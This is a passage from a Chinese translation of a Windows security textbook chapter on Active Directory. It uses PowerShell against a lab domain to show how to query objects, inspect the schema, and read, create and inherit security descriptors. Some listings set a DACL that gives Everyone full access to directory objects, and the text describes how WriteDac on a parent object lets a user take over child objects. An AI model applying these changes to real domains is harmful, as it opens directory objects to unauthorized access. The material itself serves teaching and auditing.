OU=Domain Controllers,DC=mineral,DC=local        organizationalUnit
CN=ForeignSecurityPrincipals,DC=mineral,DC=local container
--snip--

❹ PS> Get-ADObject -Identity "CN=Builtin,$root_dn" | Format-List
DistinguishedName : CN=Builtin,DC=mineral,DC=local
Name              : Builtin
ObjectClass       : builtinDomain
ObjectGUID        : 878e2263-2496-4a56-9c6e-7b4db24a6bed

❺ PS> Get-ADObject -Identity "CN=Builtin,$root_dn" -Properties * | Format-List
CanonicalName        : mineral.local/Builtin
CN                   : Builtin
--snip--
```


*代码清单 11-9：查询Active Directory服务器的对象*

首先，我们从RootDSE获取根域命名上下文❶。该命名上下文代表目录根域对象的可分辨名称，我们可以使用它来查询对象。

然后，我们使用Get-ADObject命令查询根的子对象❷。该命令接受各种选项来限制返回的子对象范围。第一个是SearchBase参数，它仅返回特定对象的子对象（在这种情况下，仅返回默认命名上下文）。我们在此提供了默认值，这并非必需，但该参数在其他情况下很有用。

第二个选项是 `SearchScope` 参数，它决定了搜索的递归程度。我们指定 `OneLevel` 来仅搜索搜索基础的直接子对象。其他值包括 `Base`（仅返回搜索基础对象）和 `Subtree`（递归搜索所有子对象）。`Filter` 参数用于限制返回的值。在此例中，我们使用 `*` 返回所有内容。

输出包括 `DistinguishedName` 和 `ObjectClass` 属性 ❸。`ObjectClass` 属性表示架构类型的名称，我们将在稍后的“Active Directory 架构”一节中再次讨论。我们可以通过将特定的可分辨名称指定为 `Identity` 参数的值来选择它 ❹。返回的对象包含目录对象的属性列表，以 PowerShell 属性的形式呈现。例如，我们可以看到 `objectGUID` 属性，它表示对象的唯一标识符。

在此例中，命令仅返回四个值。出于性能考虑，它查询一小部分属性，因为某些属性值可能相当大。要查询更多属性，请指定 `Properties` 参数，传递属性名称列表或 `*` 以返回所有属性 ❺。

#### 访问其他域中的对象

如果你位于林中的一个域的计算机上，并想访问另一个域的 Active Directory 服务器，该怎么办？你可能会尝试使用感兴趣对象的可分辨名称，如 代码清单 11-10 所示。




```
PS> Get-ADObject -Identity 'CN=Users,DC=sales,DC=mineral,DC=local'
Get-ADObject : Cannot find an object with identity: 'CN=Users,DC=sales,
DC=mineral,DC=local' under: 'DC=mineral,DC=local'.
```


*代码清单 11-10：尝试访问另一个域的 Active Directory*

如你所见，尝试访问另一个域 Active Directory 服务器中的对象会失败；命令尝试搜索具有指定可分辨名称的子对象，但找不到。

要查看另一个域的 Active Directory 服务器，你有几个选项，如 代码清单 11-11 所示。




```
PS> $dn = 'CN=Users,DC=sales,DC=mineral,DC=local'
❶ PS> $obj_sales = Get-ADObject -Identity $dn -Server SALES -Properties *
PS> $obj_sales.DistinguishedName
CN=Users,DC=sales,DC=mineral,DC=local

❷ PS> $obj_gc = Get-ADObject -Identity $dn -Server :3268 -Properties *
PS> $obj_gc.DistinguishedName
CN=Users,DC=sales,DC=mineral,DC=local

❸ PS> ($obj_sales | Get-Member -MemberType Property | Measure-Object).Count
28
PS> ($obj_gc | Get-Member -MemberType Property | Measure-Object).Count
25
```


*代码清单 11-11：访问另一个域中 Active Directory 服务器的对象*

第一个选项是使用 `Get-ADObject` 并指定 `Server` 参数来显式指定目标域 ❶。此参数接受域的简单名称或 DNS 名称，以及域内域控制器的主机名。在此例中，我们指定 `SALES`，由于该域属于我们的林，查询会返回合适的域控制器。

第二个选项是查询全局编录。如 代码清单 11-2 所示，域中的服务器使用从其他 Active Directory 服务器复制的数据来管理此编录。通过将众所周知的端口 3268 指定为 `Server` 参数来选择全局编录 ❷。在此例中，我们不指定域或服务器名称，默认选择当前域中的全局编录。但如果你愿意，可以通过在端口前加上域名来查询另一个域中的全局编录。

需要记住的一点是，全局编录仅包含 Active Directory 服务器中完整数据的子集。如果我们计算返回的属性数量，可以看到对象包含 28 个属性 ❸，而全局编录版本仅返回 25 个。对于某些对象类，属性数量的差异可能更加显著。

你可能会想：为什么不直接查询域以获取 Active Directory 信息呢？基本上，这是位置的问题。你运行命令的域可能位于世界的另一端，与目标域通过高延迟卫星链路连接。直接查询目标可能缓慢、昂贵，或两者兼有。相比之下，本地全局编录可能位于隔壁办公室的域控制器上，这提供了便利，即使它不会提供相同级别的详细信息。

### 架构（Schema）

Active Directory 服务器的架构描述了目录中存在的对象类别、这些类别可能包含的属性，以及类别之间的关系。目录中的每个对象都被分配到一个或多个类别；例如，组属于 `group` 类别。您可以在对象的 `objectClass` 属性中找到其类别。

每个对象类别都有对应的架构类型。架构可以将这些类型组织成层次结构，如 图 11-3 所示。

![img](./image/03.PART%20III%20THE%20LOCAL%20SECURITY%20AUTHORITY%20AND%20AUTHENTICATION/Figure11-3.webp)

图 11-3：`group`、`user` 和 `computer` 类别的架构层次结构

所有架构类别类型都派生自一个基础类型，即 `top` 类 ❶，每个类别对象的 `subClassOf` 属性指定了其派生自的类别。例如，`group` 类型 ❷ 将 `top` 指定为其唯一的 `subClassOf` 值。

每个类别类型还可以包含一个属性列表，列出该类别实例可以包含的属性 ❸。该列表分为 `mustContain`（必选属性）和 `mayContain`（可选属性）。在 图 11-3 中，例如，`mustContain` 属性包含必选的 `groupType` 属性，用于指示组是通用（Universal）、全局（Global）还是域本地（DomainLocal）。然而，`member` 属性（包含组成员列表）是可选的，因为组可能没有成员。

第二组属性列表，`systemMustContain` 和 `systemMayContain`，包含仅 Active Directory 服务器可以修改的必选和可选属性；普通用户无法更改这些属性。

并非所有类别架构类型都像 `group` 一样简单。例如，`user` 类 ❹ 是 `organizationalPerson` 的子类，而 `organizationalPerson` 本身是 `person` 的子类，`person` 又是 `top` 的子类。这些架构类别类型中的每一个都可以为最终的子类对象贡献必选和可选属性。

一个类别还可以包含辅助类别列表，通过 `auxiliaryClass` 和 `systemAuxiliaryClass` 属性定义 ❺。我们可以使用这些类别为架构类别添加额外属性，而无需将其纳入继承层次结构。

每个类别都有一个 `objectClassCategory` 属性，用于定义该类别的使用方式。它可以是以下值之一：

结构类（Structural）  该类可以用作对象。

抽象类（Abstract）  该类仅用于继承。

辅助类（Auxiliary）  该类仅用作辅助类。

另一种类型 `Class88` 表示在最早的 LDAP 规范中定义的类别。只有某些系统类别使用此类型，新的架构类别不应使用它。

#### 检查架构

我们可以使用与检查用户或组对象相同的工具来检查架构。管理员还可以修改架构以添加新类型和属性。例如，Exchange 邮件服务器可能会修改其安装所在的 Active Directory 服务器，为用户对象添加额外的电子邮件地址属性。

由于架构是目录的一部分，我们可以使用 `Get-ADObject` 命令来检查它，如 代码清单 11-12 所示。




```
❶ PS> $schema_dn = (Get-ADRootDSE).schemaNamingContext
PS> Get-ADObject -SearchBase $schema_dn -SearchScope OneLevel -Filter * |
Sort-Object Name | Select-Object Name, ObjectClass
Name                    ObjectClass
----                    -----------
❷ account                 classSchema
Account-Expires         attributeSchema
Account-Name-History    attributeSchema
--snip--

❸ PS> Get-ADObject -SearchBase $schema_dn -Filter {
    ObjectClass -eq "classSchema"
} -Properties * | Sort-Object Name |
Format-List Name, {[guid]$_.schemaIDGUID}, mayContain,
mustContain, systemMayContain, systemMustContain, auxiliaryClass,
systemAuxiliaryClass, SubClassOf
Name                  : account
❹ [guid]$_.schemaIDGUID : 2628a46a-a6ad-4ae0-b854-2b12d9fe6f9e
❺ mayContain            : {uid, host, ou, o...}
mustContain           : {}
systemMayContain      : {}
systemMustContain     : {}
❻ auxiliaryClass        : {}
systemAuxiliaryClass  : {}
❼ SubClassOf            : top
--snip--

❽ PS> Get-ADObject -SearchBase $schema_dn -Filter {
    lDAPDisplayName -eq "uid"
} -Properties * | Format-List adminDescription, {[guid]$_.schemaIDGUID},
attributeSyntax, oMSyntax, oMObjectClass
adminDescription      : A user ID.
[guid]$_.schemaIDGUID : 0bb0fca0-1e89-429f-901a-1413894d9f59
attributeSyntax       : 2.5.5.12
oMSyntax              : 64
oMObjectClass         :
```


*代码清单 11-12：枚举架构对象*

我们首先查询架构命名上下文下的所有对象，并将其显示到 shell 中 ❶。输出显示每个架构对象的名称及其对象类别 ❷。我们可以看到两个类别，`classSchema` 和 `attributeSchema`，它们分别表示对象类别和属性的架构类型。

接下来，我们再次查询架构对象和属性，但这次我们使用过滤器仅选择 `ObjectClass` 属性等于 `classSchema` 的对象 ❸。`Filter` 属性接受 PowerShell 风格的表达式，可以根据对象的属性过滤返回的对象。服务器会评估此过滤器以提高性能，因为它不会返回不符合过滤条件的对象。

请注意，过滤器字符串不是完整的 PowerShell 脚本，尽管它使用类似的语法，因此您无法在过滤器中执行复杂的脚本操作。ActiveDirectory 模块中的命令还支持 `LDAPFilter` 参数，该参数使用 LDAP 规范中相对不太直观的过滤语法。（从技术上讲，即使您使用 `Filter` 参数，PowerShell 也会在将查询发送到 LDAP 服务器之前将其转换为 LDAP 过滤器，因为 Active Directory 目前还不能直接执行 PowerShell 代码。）

返回的类对象显示在控制台中，我已在其中高亮了一些重要属性。首先是 `schemaIDGUID` 属性❹，它表示架构类型的唯一标识符。Microsoft 记录了大多数此类架构标识符，但管理员也可以自行添加。目录将 `schemaIDGUID` 属性存储为字节数组，因此我们将其转换为 `guid` 对象以便更轻松地查看值。

请注意，`schemaIDGUID` 不会与分配给对象的 `objectGUID` 属性匹配。`objectGUID` 在目录中应是唯一的，但不一定全局唯一。而 `schemaIDGUID` 在所有 Active Directory 服务器实例中应具有相同的值。

接下来的四个属性❺表示该类可以包含的属性列表。在本例中，只有 `mayContain`（可选类属性列表）包含值。每个条目通过一个在 Active Directory 服务器中唯一的名称进行标识。

然而，这些列表并非详尽无遗；除此之外，该类还可能包含来自其配置的辅助类的属性（尽管在此示例中，没有列出任何辅助类❻）。它还会包含从父类继承的任何属性，您可以在 `SubClassOf` 属性❼中找到这些属性。要获取类可以包含的完整属性列表，您需要枚举整个继承链以及所有辅助类。

由于 `lDAPDisplayName` 属性值是唯一的，我们可以通过指定特定的属性值来返回属性的架构类型。在本例中，我们使用属性列表中的第一个值 `uid`❽，并显示架构类型的一些属性，包括属性描述和 `schemaIDGUID`。

#### 访问安全属性

正如您刚才所见，手动检查架构是一个复杂的过程。尽管如此，我们仍需理解架构以分析目录的安全性。为此，`NtObjectManager` 模块附带了一些命令，用于返回架构的安全特定属性。代码清单 11-13 展示了这些命令中最简单的一个，即 `Get-DsSchemaClass`。




```
PS> Get-DsSchemaClass | Sort-Object Name
Name              SchemaId                             Attributes
----              --------                             ----------
account           2628a46a-a6ad-4ae0-b854-2b12d9fe6f9e 7
aCSPolicy         7f561288-5301-11d1-a9c5-0000f80367c1 17
aCSResourceLimits 2e899b04-2834-11d3-91d4-0000f87a57d4 5
aCSSubnet         7f561289-5301-11d1-a9c5-0000f80367c1 26
--snip--
```


*代码清单 11-13：枚举所有架构类*

当我们不指定任何参数时，该命令会从架构中查找所有类类型对象并返回它们。输出显示每个类型的 LDAP 名称和架构标识符，以及该类型可以包含的属性总数，包括所有必需属性和系统属性。

> 注意
>
> *根据架构的复杂性和网络速度，查询所有架构类型可能需要一些时间。然而，一旦命令下载了这些类型，它就会缓存它们，因此在同一个 PowerShell 会话中下次请求时，您应该会收到快速响应。*

代码清单 11-14 展示了如何使用模块的命令检查账户类型。




```
PS> $cls = Get-DsSchemaClass -Name "account"
PS> $cls | Format-List
Name        : account
CommonName  : account
Description : The account object class is used to define entries...
SchemaId    : 2628a46a-a6ad-4ae0-b854-2b12d9fe6f9e
SubClassOf  : top
Category    : Structural
Attributes  : {uid, host, ou, o...}

❶ PS> $cls.Attributes
Name        Required System
----        -------- ------
uid            False  False
host           False  False
ou             False  False
o              False  False
l              False  False
seeAlso        False  False
description    False  False

❷ PS> $cls.Attributes | Get-DsSchemaAttribute
Name        SchemaId                             AttributeType
----        --------                             -------------
uid         0bb0fca0-1e89-429f-901a-1413894d9f59 String(Unicode)
host        6043df71-fa48-46cf-ab7c-cbd54644b22d String(Unicode)
ou          bf9679f0-0de6-11d0-a285-00aa003049e2 String(Unicode)
o           bf9679ef-0de6-11d0-a285-00aa003049e2 String(Unicode)
l           bf9679a2-0de6-11d0-a285-00aa003049e2 String(Unicode)
seeAlso     bf967a31-0de6-11d0-a285-00aa003049e2 Object(DS-DN)
description bf967950-0de6-11d0-a285-00aa003049e2 String(Unicode)

❸ PS> Get-DsSchemaClass -Parent $cls -Recurse
Name SchemaId                             Attributes
---- --------                             ----------
top  bf967ab7-0de6-11d0-a285-00aa003049e2 125
```


*代码清单 11-14：检查单个类架构类型*

您可以使用 `Name` 参数指定类的 LDAP 名称，或使用 `SchemaId` 参数指定架构标识符。

返回的对象包含一个 `Attributes` 属性，该属性保存了该类的所有属性列表❶。该命令不是包含单独的属性列表，而是为每个属性分配 `Required` 和 `System` 属性，以指示它们来源的列表。

要获取有关属性的更多信息，您可以将它们传递给 `Get-DsSchemaAttribute` 命令，该命令会查找架构属性类型❷。此命令返回 LDAP 名称（`Name`）和架构标识符（`SchemaId`）属性，以及解码后的属性类型（`AttributeType`）。例如，我们可以看到 `uid` 类型是 Unicode 字符串，而 `seeAlso` 类型是包含可分辨名称的字符串。

最后，您可以通过使用 `Parent` 参数并指定现有的类对象来直接查找父类❸。您还可以指定 `Recurse` 参数以递归枚举所有父类。在本例中，唯一的父类是 `top`，但查询更复杂的类（如 `user`）将返回更多架构类。

### 安全描述符

在Windows中，几乎每次需要保护资源时，我们都会用到安全描述符和访问检查，Active Directory也不例外。LDAP支持身份验证，Active Directory服务器利用它来创建代表用户的令牌，然后使用该令牌确定给定用户可以操作哪些对象和属性。让我们首先讨论如何在Active Directory服务器上查询和存储安全描述符。

#### 查询目录对象的安全描述符

每个目录对象在创建时都会分配一个安全描述符。该对象将此安全描述符以字节数组的形式存储在名为`nTSecurityDescriptor`的强制属性中。由于此属性在顶层类中定义，所有对象类都需要它。代码清单 11-15检查了属性架构类，并显示“必需”为“是”。



```
PS> (Get-DsSchemaClass top).Attributes |
Where-Object Name -Match nTSecurityDescriptor
Name                 Required System
----                 -------- ------
nTSecurityDescriptor     True   True
```


*代码清单 11-15：检查顶层类中的nTSecurityDescriptor属性*

> 注意
>
> *名称nTSecurityDescriptor中的小写字母*n*可能看起来奇怪，但它是正确的。虽然LDAP名称查找不区分大小写，但名称本身是使用小驼峰式命名法定义的。*

要读取安全描述符，用户必须根据其请求的安全描述符部分，获得对象上的`ReadControl`或`AccessSystemSecurity`访问权限。代码清单 11-16展示了检索Active Directory服务器对象安全描述符的两种技术。



```
PS> $root_dn = (Get-ADRootDSE).defaultNamingContext
❶ PS> $obj = Get-ADObject -Identity $root_dn -Properties "nTSecurityDescriptor"
PS> $obj.nTSecurityDescriptor.Access
ActiveDirectoryRights : ReadProperty
InheritanceType       : None
ObjectType            : 00000000-0000-0000-0000-000000000000
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : None
AccessControlType     : Allow
IdentityReference     : Everyone
IsInherited           : False
InheritanceFlags      : None
PropagationFlags      : None
--snip--

❷ PS> Format-Win32SecurityDescriptor -Name $root_dn -Type Ds
Path: DC=mineral,DC=local
Type: DirectoryService
Control: DaclPresent, DaclAutoInherited

<Owner>
 - Name  : BUILTIN\Administrators
 - Sid   : S-1-5-32-544

<Group>
 - Name  : BUILTIN\Administrators
 - Sid   : S-1-5-32-544

<DACL> (Auto Inherited)
 - Type  : AllowedObject
 - Name  : BUILTIN\Pre-Windows 2000 Compatible Access
 - SID   : S-1-5-32-554
 - Mask  : 0x00000010
 - Access: ReadProp
 - Flags : ContainerInherit, InheritOnly
 - ObjectType: 4c164200-20c0-11d0-a768-00aa006e0529
 - InheritedObjectType: 4828cc14-1437-45bc-9b07-ad6f015e5f28
--snip--
```


*代码清单 11-16：访问根对象的安全描述符*

第一种技术使用`nTSecurityDescriptor`查询对象的安全描述符❶。`Get-ADObject`命令会自动将安全描述符转换为.NET `ActiveDirectorySecurity`类的实例，因此我们可以使用`Access`属性显示其DACL。

第二种技术使用`NtObjectManager`模块中的Win32安全描述符命令，指定`Ds`类型和对象的可分辨名称作为路径名。在此示例中，我们使用`Format-Win32SecurityDescriptor`命令❷获取安全描述符并立即格式化。

何时选择使用一种技术而不是另一种？如果您安装了`NtObjectManager`模块，Win32安全描述符命令是更好的选择，因为它们不会修改从安全描述符检索到的信息。例如，您可能会注意到从每个命令返回的DACL中的第一个ACE并不相同。一个属于*Everyone*用户，而另一个属于*BUILTIN\Pre-Windows 2000 Compatible Access*。

差异源于`Get-ADObject`命令用于从其属性返回安全描述符的`ActiveDirectorySecurity`类会自动规范化DACL，然后才允许用户访问。规范化过程可能会隐藏安全配置错误。而Win32命令不会进行任何规范化。

请注意，如果您通过SAM远程服务访问域控制器，实际上您访问的是Active Directory服务器的用户配置，而不是本地SAM数据库。但如果您检查各种受支持对象的安全描述符，SAM远程服务不会返回Active Directory中的那些。相反，LSA会从预定义集合中选择一个安全描述符，选择与目录对象中最匹配的那个。这仅仅是表面现象；最终，任何访问检查都将针对存储在Active Directory服务器中的安全描述符进行。

#### 为新目录对象分配安全描述符

当我们创建新的Active Directory对象时，可以通过为对象的`nTSecurityDescriptor`属性提供字节数组来为其分配安全描述符。代码清单 11-17展示了在以域管理员身份运行PowerShell时如何设置此安全描述符。请勿在生产环境中运行这些命令，因为修改Active Directory可能会产生不利影响。



```
❶ PS> $sd = New-NtSecurityDescriptor -Type DirectoryService
PS> Add-NtSecurityDescriptorAce $sd -KnownSid BuiltinAdministrators
-Access All
PS> $root_dn = (Get-ADRootDSE).defaultNamingContext
❷ PS> $obj = New-ADObject -Type "container" -Name "SDDEMO" -Path $root_dn
-OtherAttributes @{nTSecurityDescriptor=$sd.ToByteArray()} -PassThru
PS> Format-Win32SecurityDescriptor -Name $obj.DistinguishedName -Type Ds
Path: cn=SDDEMO,DC=mineral,DC=local
Type: DirectoryService
Control: DaclPresent, DaclAutoInherited

<Owner>
 - Name  : MINERAL\Domain Admins
 - Sid   : S-1-5-21-146569114-2614008856-3334332795-512

<Group>
 - Name  : MINERAL\Domain Admins
 - Sid   : S-1-5-21-146569114-2614008856-3334332795-512

<DACL> (Auto Inherited)
 ❸ - Type  : Allowed
 - Name  : BUILTIN\Administrators
 - SID   : S-1-5-32-544
 - Mask  : 0x000F01FF
 - Access: Full Access
 - Flags : None

 ❹ - Type  : AllowedObject
 - Name  : BUILTIN\Pre-Windows 2000 Compatible Access
 - SID   : S-1-5-32-554
 - Mask  : 0x00000010
 - Access: ReadProp
 - Flags : ContainerInherit, InheritOnly, Inherited
 - ObjectType: 4c164200-20c0-11d0-a768-00aa006e0529
 - InheritedObjectType: 4828cc14-1437-45bc-9b07-ad6f015e5f28
--snip--
```


*代码清单 11-17：使用安全描述符创建新的Active Directory对象*

我们首先创建一个包含单个ACE的安全描述符，该ACE授予*Administrators*组完全访问权限❶。然后，我们使用`New-ADObject`命令创建一个名为`SDDEMO`的新容器对象❷，并使用`OtherAttributes`参数指定安全描述符。

接下来，我们格式化新对象的安全描述符。如您所见，我们指定的ACE位于DACL的顶部❸，但在我们指定的ACE之后出现了其他ACE❹，这是因为自动继承规则适用于父对象的DACL和SACL。（如第6章所述，您可以指定`DaclProtected`和`SaclProtected`安全描述符控制标志，以防止可继承的ACE应用于对象，但此处我们未这样做。）

如果在创建对象时未指定安全描述符值，会发生什么？在这种情况下，对象将使用默认安全描述符，该描述符取自模式类对象的`defaultSecurityDescriptor`属性。代码清单 11-18展示了如何基于此默认安全描述符属性手动创建新的对象安全描述符。这模拟了Active Directory服务器执行的操作。




```
PS> $root_dn = (Get-ADRootDSE).defaultNamingContext
❶ PS> $cls = Get-DsSchemaClass -Name "container"
❷ PS> $parent = Get-Win32SecurityDescriptor $root_dn -Type Ds
❸ PS> $sd = New-NtSecurityDescriptor -Parent $parent -EffectiveToken
-ObjectType $cls.SchemaId -Creator $cls.DefaultSecurityDescriptor
-Type DirectoryService -AutoInherit DaclAutoInherit, SaclAutoInherit
-Container
PS> Format-NtSecurityDescriptor $sd -Summary
<Owner> : MINERAL\alice
<Group> : MINERAL\Domain Users
<DACL> (Auto Inherited)
MINERAL\Domain Admins: (Allowed)(None)(Full Access)
NT AUTHORITY\SYSTEM: (Allowed)(None)(Full Access)
--snip--

❹ PS> $std_sd = Edit-NtSecurityDescriptor $sd -Standardize -PassThru
❺ PS> Compare-NtSecurityDescriptor $std_sd $sd -Report
WARNING: DACL ACE 1 mismatch.
WARNING: Left : Type Allowed - Flags None - Mask 00020094 - Sid S-1-5-11
WARNING: Right: Type Allowed - Flags None - Mask 000F01FF - Sid S-1-5-18
WARNING: DACL ACE 2 mismatch.
WARNING: Left : Type Allowed - Flags None - Mask 000F01FF - Sid S-1-5-18
WARNING: Right: Type Allowed - Flags None - Mask 00020094 - Sid S-1-5-11
False
```


*代码清单 11-18：创建新的对象安全描述符*

首先，我们获取容器模式类❶。通过检查此类的模式标识符，我们可以确定哪些对象ACE被继承（那些设置了`InheritedObjectType`值的ACE），并识别该类的默认安全描述符。然后，我们从父对象（即根域对象❷）获取安全描述符。

接下来，我们调用`New-NtSecurityDescriptor`，指定父安全描述符、默认安全描述符和对象类型❸。我们还指定自动继承标志，以自动继承任何DACL或SACL ACE，并使用`Container`参数来标识安全描述符将保护一个容器，这确保其使用正确的继承规则。最后，我们可以格式化新创建的安全描述符，该描述符已自动继承了DACL。

新安全描述符的所有者和组SID可能是您预期的：即基于其的Token对象的用户SID和主组SID。然而，情况并非总是如此。如果对象的创建者是Active Directory服务器上的本地管理员，服务器会将所有者和组SID更改为以下SID之一：

***Domain Admins\***    为域根下默认命名上下文中的任何对象设置

***Enterprise Admins\***    为配置命名上下文中的任何对象设置

***Schema Admins\***    为模式命名上下文中的任何对象设置

将所有者和组SID更改为这些值之一可确保林中的资源具有适当的所有者。例如，如果*Enterprise Admins*不是配置对象的默认所有者，林中的不同域管理员可能会创建对象，而另一个域的管理员即使属于正确的组也可能无法访问该对象。

要创建最终的安全描述符，我们必须执行最后一步：标准化。*安全描述符标准化*是Windows Server 2003中引入的一项功能，默认情况下已启用。它确保非继承的ACE始终以二进制比较顺序出现。这与第5章中描述的ACL规范化过程形成对比，后者根据ACE类型而非二进制值对ACE进行排序。因此，具有相同ACE条目的两个规范化ACL可能具有不同的排序。

我们可以使用`Edit-NtSecurityDescriptor`命令和`Standardize`参数来标准化安全描述符❹。但请注意，标准化后的ACL形式并不总是与规范化形式匹配。实际上，如果我们将原始的规范化安全描述符（如代码清单 11-16所示）与标准化后的进行比较，`Compare-NtSecurityDescriptor`命令会显示两个重新排序的ACE❺。理论上，这种差异可能会改变访问检查的结果，但在实践中不太可能发生，因为无论其他ACE排序规则如何，拒绝ACE总是出现在允许ACE之前。

管理员可以通过在目录的特殊`dsHeuristics`属性中设置标志来禁用标准化功能。您可以使用`Get-DsHeuristics` PowerShell命令查询此标志，如代码清单 11-19所示。




```
PS> (Get-DsHeuristics).DontStandardizeSDs
False
```


*代码清单 11-19：检查是否启用了安全描述符标准化*

如果命令返回True，则安全描述符标准化已禁用。

#### 为现有对象分配安全描述符

您可以使用 `Set-Win32SecurityDescriptor` PowerShell 命令，基于对象的可分辨名称来更改现有对象的安全描述符。代码清单 11-20 演示了如何对对象 `CN=SomeObject,DC=mineral,DC=local` 执行此操作。在运行脚本之前，请将此名称更改为 Active Directory 配置中实际存在的对象名称。




```
PS> $dn = "CN=SomeObject,DC=mineral,DC=local"
PS> $sd = New-NtSecurityDescriptor "D:(A;;GA;;;WD)"
PS> Set-Win32SecurityDescriptor $dn -Type Ds -SecurityDescriptor $sd
-SecurityInformation Dacl
```


*代码清单 11-20：使用 Set-Win32SecurityDescriptor 命令设置对象的安全描述符*

该命令向目录服务器发送修改请求，以设置 `NtSecurityDescriptor` 属性。如第 6 章所述，修改安全描述符的用户必须对对象拥有适当的访问权限（例如 `WriteDac` 访问权限），才能写入安全描述符的相应部分。

安全信息标志指定了您可以修改安全描述符的哪些部分。要获取此信息，请请求对象的构造属性 `sDRightsEffective`。`Get-DsSDRightsEffective` PowerShell 命令可公开此属性，如代码清单 11-21 所示。




```
PS> Get-DsSDRightsEffective -DistinguishedName $dn
Owner, Group, Dacl
```


*代码清单 11-21：查询有效的安全信息*

输出表明，当前调用者将获得对所有者、组和 DACL 的写入访问权限。此结果考虑了诸如 `SeTakeOwnershipPrivilege` 之类的特权，该特权允许调用者修改所有者，即使安全描述符未授予 `WriteOwner` 访问权限。目录还允许调用者使用特权绕过某些检查；例如，它可以检查 `SeRestorePrivilege` 以确定调用者是否可以设置任意所有者 SID。

> 注意
>
> *要使用 `Set-Win32SecurityDescriptor` 命令添加或移除 DACL 保护标志，您需要使用 `ProtectedDacl` 或 `UnprotectedDacl` 安全信息标志。这些标志不会直接传递给服务器；相反，它们会设置在安全描述符的控制标志中，然后随描述符一起发送到服务器。*

在代码清单 11-22 中，我们为对象构建了一个新的安全描述符，该描述符基于三个值派生：用户提供的安全描述符、当前安全描述符和父级安全描述符。




```
PS> $root_dn = (Get-ADRootDSE).defaultNamingContext
PS> $user_dn = "CN=Users,$root_dn"
❶ PS> $curr_sd = Get-Win32SecurityDescriptor "CN=Users,$root_dn" -Type Ds
PS> Format-NtSecurityDescriptor $curr_sd -Summary
<Owner> : DOMAIN\Domain Admins
<Group> : DOMAIN\Domain Admins
<DACL> (Auto Inherited)
NT AUTHORITY\SYSTEM: (Allowed)(None)(Full Access)
--snip--

❷ PS> $new_sd = New-NtSecurityDescriptor "D:(A;;GA;;;WD)"
❸ PS> Edit-NtSecurityDescriptor -SecurityDescriptor $curr_sd
-NewSecurityDescriptor $new_sd -SecurityInformation Dacl
-Flags DaclAutoInherit, SaclAutoInherit

PS> $cls = Get-DsObjectSchemaClass $user_dn
PS> $parent = Get-Win32SecurityDescriptor $root_dn -Type Ds
❹ PS> $sd = New-NtSecurityDescriptor -Parent $parent
-ObjectType $cls.SchemaId -Creator $curr_sd -Container
-Type DirectoryService -AutoInherit DaclAutoInherit, SaclAutoInherit,
AvoidOwnerCheck, AvoidOwnerRestriction, AvoidPrivilegeCheck
-EffectiveToken

❺ PS> Edit-NtSecurityDescriptor $sd -Standardize
PS> Format-NtSecurityDescriptor $sd -Summary
<Owner> : DOMAIN\Domain Admins
<Group> : DOMAIN\Domain Admins
<DACL> (Auto Inherited)
Everyone: (Allowed)(None)(Full Access)
--snip--
```


*代码清单 11-22：为对象创建新的安全描述符*

首先，我们获取对象的当前安全描述符。在此示例中，我选择了 `Users` 容器，因为它提供了一个简单的示例 ❶，但您可以选择目录中的任何对象。接下来，我们创建一个新的安全描述符 ❷，并使用 `Edit-NtSecurityDescriptor` PowerShell 命令修改对象现有的安全描述符，将其替换为我们刚刚创建的描述符 ❸。在此命令中，我们必须指定安全信息标志以及自动继承标志。

然后，我们使用修改后的安全描述符作为创建者安全描述符，并使用父级安全描述符和目标对象的类信息进行继承 ❹。我们指定了一些额外的自动继承标志来禁用所有者检查；这确保我们基于原始安全描述符正确设置所有者值。禁用检查并非安全问题，因为调用者必须设置 `Owner` 安全信息标志才能更改所有者，而 `Edit-NtSecurityDescriptor` 会检查所有者 SID，从而防止用户绕过此检查。

现在，我们可以标准化安全描述符并设置其格式 ❺。如您所见，它现在包含 `Everyone` ACE，与我们指定的新安全描述符匹配。此时，服务器还将枚举我们正在修改的安全描述符的任何子对象，并将任何继承更改应用到我们引入的新安全描述符。

请注意，每当父对象的安全描述符更改时，服务器会自动将可继承的 ACE 传播到子对象。此行为与文件和注册表键的行为形成对比，在那些情况下，由 Win32 API 负责手动将继承传播到子对象。自动传播引入了一个有趣的后果：服务器不会检查设置安全描述符的用户是否对子对象拥有适当的访问权限。因此，对层次结构中较高层对象拥有 `WriteDac` 访问权限的用户可以设置新的可继承 ACE，并为自己授予对之前无权访问的子对象的访问权限。

缓解此行为的唯一方法是在对象的安全描述符中设置 `DaclProtected` 控制标志以阻止继承（同时，管理员绝不应向非管理员用户授予 `WriteDac` 访问权限）。

#### 检查安全描述符的继承安全

由于安全描述符是基于对象层次结构分配的，因此可以使用 `Search-Win32SecurityDescriptor` PowerShell 命令定位其继承 ACE 的来源。在 代码清单 11-23 中，我们查找 Users 容器的继承 ACE。




```
PS> $root_dn = (Get-ADRootDSE).defaultNamingContext
PS> $user_dn = "CN=Users,$root_dn"
PS> $cls = Get-DsObjectSchemaClass -DistinguishedName $user_dn
PS> Search-Win32SecurityDescriptor -Name $user_dn -Type Ds
-ObjectType $cls.SchemaId
Name                Depth User                             Access
----                ----- ----                             ------
                    0     NT AUTHORITY\SYSTEM              GenericAll
                    0     MINERAL\Domain Admins            CreateChild|...
                    0     BUILTIN\Account Operators        CreateChild|...
                    0     BUILTIN\Account Operators        CreateChild|...
                    0     BUILTIN\Print Operators          CreateChild|...
                    0     NT AUTHORITY\Authenticated Users GenericRead
                    0     BUILTIN\Account Operators        CreateChild|...
DC=mineral,DC=local 1     BUILTIN\Pre-Windows 2000...      ReadProp
DC=mineral,DC=local 1     BUILTIN\Pre-Windows 2000...      ReadProp
DC=mineral,DC=local 1     BUILTIN\Pre-Windows 2000...      ReadProp
```


*代码清单 11-23：搜索继承 ACE 的来源*

你可以将此命令用于 Active Directory 对象，其使用方式与文件几乎相同。重要区别在于，你必须将 `Type` 属性设置为 `Ds`，以便在服务器上查找 Active Directory 对象。

此外，你还需要使用 `ObjectType` 参数指定继承 ACE 的架构类 GUID；否则，命令可能根本无法找到源 ACE，因为它们很可能是基于对象类型继承的。在我的测试中，当我不指定对象类型时，搜索有时会成功，但在大多数情况下，操作会因无关错误而失败。

### 访问检查

现在我们可以查询对象的安全描述符，接下来可以执行访问检查，以确定它是否会授予用户某些特定访问权限。Active Directory 指定了目录对象可以授予的九种特定于类型的访问权限，此外还有标准权限，如 ReadControl 和 WriteDac（分别用于读取和写入对象上的安全描述符）。它们分别是：

CreateChild  允许创建新的子对象

DeleteChild  允许删除子对象

List  允许列出子对象

